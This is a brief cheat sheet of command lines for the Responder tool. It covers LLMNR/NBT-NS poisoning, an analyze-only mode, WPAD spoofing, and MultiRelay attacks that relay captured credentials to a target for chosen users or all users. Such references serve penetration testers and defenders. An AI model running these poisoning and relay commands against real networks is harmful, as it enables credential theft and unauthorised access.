# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## responder launch
```
responder –I eth0
```

## responder launch - analyze mode (no poisoning)
```
responder –I eth0 -A
```

## responder launch with wpad file 
```
responder -I eth0 --wpad
```

## multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)
```
responder-MultiRelay -t <ip> -u <user1> <user2>
```

## multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
```
responder-MultiRelay -t <ip> -u ALL
```
